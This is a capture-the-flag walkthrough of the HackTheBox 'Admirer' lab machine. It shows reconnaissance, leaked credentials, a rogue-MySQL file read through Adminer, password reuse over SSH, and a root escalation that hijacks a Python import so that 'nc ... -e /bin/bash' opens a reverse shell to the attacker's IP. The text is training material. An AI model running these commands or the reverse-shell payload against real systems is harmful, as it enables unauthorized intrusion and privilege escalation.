# Scan

```bash
ghost@localhost [02:05:59] [~/Documents/hacking/tj-null-boxes/admirer] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.187:21
Open 10.10.10.187:22
Open 10.10.10.187:80

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a71e92163699dcbdd84021a2397e1b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQHjxkc8zeXPgI5C7066uFJaB6EjvTGDEwbfl0cwM95npP9G8icv1F/YQgKxqqcGzl+pVaAybRnQxiZkrZHbnJlMzUzNTxxI5cy+7W0dRZN4VH4YjkXFrZRw6dx/5L1wP4qLtdQ0tLHmgzwJZO+111mrAGXMt0G+SCnQ30U7vp95EtIC0gbiGDx0dDVgMeg43+LkzWG+Nj+mQ5KCQBjDLFaZXwCp5Pqfrpf3AmERjoFHIE8Df4QO3lKT9Ov1HWcnfFuqSH/pl5+m83ecQGS1uxAaokNfn9Nkg12dZP1JSk+Tt28VrpOZDKhVvAQhXWONMTyuRJmVg/hnrSfxTwbM9
|   256 c595b6214d46a425557a873e19a8e702 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNHgxoAB6NHTQnBo+/MqdfMsEet9jVzP94okTOAWWMpWkWkT+X4EEWRzlxZKwb/dnt99LS8WNZkR0P9HQxMcIII=
|   256 d02dddd05c42f87b315abe57c4a9a756 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqp21lADoWZ+184z0m9zCpORbmmngq+h498H9JVf7kP
80/tcp open  http    syn-ack Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Admirer
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


# 80

At http://10.10.10.187/robots.txt found an admin directory. But http://10.10.10.187/admin-dir/ seems to be blocked by Apache.

Also by entering `index.php` it shows that the website is hosting PHP.

I tried `feroxbuster` on `/` and nothing much. Then I tried for `admin-dir` initially nothing, even with PHP extension. So I tried with `txt` and found 2 files.

```bash
ghost@localhost [02:15:42] [~/Documents/hacking/tj-null-boxes/admirer] [master *]
-> % feroxbuster -u http://$IP/admin-dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -x txt

301      GET        9l       28w      316c http://10.10.10.187/admin-dir => http://10.10.10.187/admin-dir/
200      GET       29l       39w      350c http://10.10.10.187/admin-dir/contacts.txtadminer
200      GET       11l       13w      136c http://10.10.10.187/admin-dir/credentials.txt
```

http://10.10.10.187/admin-dir/contacts.txt

```bash
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

http://10.10.10.187/admin-dir/credentials.txt

```bash
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Using FTP credentials, I login to the server and downloaded the following 2 files
- dump.sql
- html.tar.gz

From `html` I found credentials at `db_admin.php`. But the strange thing is the PHP script cannot be found on server.
http://10.10.10.187/utility-scripts/db_admin.php

```bash
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```

Gobuster does not give much info. But since the machine name is `Adminer` I tried `adminer.php` and get back a URL.

It is running Adminer v4.6.2.

I am doing an attack scenario explained by this post (https://infosecwriteups.com/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f).

So I use docker to setup MySQL server in my Kali machine.

```bash
ghost@localhost [03:03:12] [~/Documents/hacking/tj-null-boxes/adminer] [master *]
-> % docker ps -a
CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS                      PORTS                                                                                  NAMES
dfeba74b44ca   mysql:5.7              "docker-entrypoint.s…"   37 seconds ago   Up 4 seconds                0.0.0.0:3306->3306/tcp, :::3306->3306/tcp, 33060/tcp                                   adminer_db_1
```

After that using the following credentials I connect to my own MySQL database.

```text
Server: 10.10.14.4
Username: adminer
Password: password
Database: db
```

Then I created a new table called `pwn3d` and tried to read a file. I cannot read `/etc/passwd` but I can read `/var/www/html/index.php`. I wanted to read `etc/passwd` to find out list of users.

```SQL
LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE db.pwn3d FIELDS TERMINATED BY "\n";

SELECT * FRO db.pwn3d;
```

From reading the file, I found database credential for the actual database.

```php
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```

Using this now I can access to the database. There's nothing inside the database that caught my attention. So instead I tried for password reuse. There are 2 potential users in the system
- w.cooper (cooper)
- waldo

I tried SSH into the server with waldo first using 6 passwords we have so far. The follow credential got access into the server.
- waldo
- &<h5b~yK3F#{PaPB&dA}{H>


# User

```bash
ghost@localhost [03:27:27] [~/Documents/hacking/tj-null-boxes/admirer] [master *]
-> % ssh waldo@10.10.10.187

waldo@admirer:~$ cat user.txt
228c32661c533d74430c61626480feaf
```


# Privilege escalation

There are several users on the system

```bash
waldo@admirer:~$ ls /home
amy  bernadette  howard  leonard  penny  rajesh  waldo
```

So it can be either lateral movement first then privilege escalation or privilege escalation directly and gain root access.

I chose to do the latter first.

```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

One thing to take note is `SETENV` means this user can set the environment variable and override the sudo defaults with `-E`.

I can see that the user can run `admin_tasks.sh` with root privilege.

```bash
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

in backup, it is importing `backup.py` from `/opt/scripts`.

So I looked the code.

```python
waldo@admirer:~$ cat /opt/scripts/backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

So the python script is importing `make_archive` from `shutil`.

We can hijack the execution, and spawn a bash shell to do privilege escalation. I wrote the following exploit under `/dev/shm` and change python default import path.

```python
import os

def make_archive(a, b, c):
        os.system("nc -nv 10.10.14.3 4444 -e /bin/bash")
```

Then we override the `PYTHONPATH` (https://bic-berkeley.github.io/psych-214-fall-2016/using_pythonpath.html). Then run a script.

```bash
waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:/dev/shm$ (UNKNOWN) [10.10.14.3] 4444 (?) open
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
```

Receives a reverse shell as below.

```bash
ghost@localhost [23:20:54] [~/Documents/hacking/tj-null-boxes/admirer] [master]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.187] 47658
id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
85948426eeb8d66e83d50b87225dcc91
```
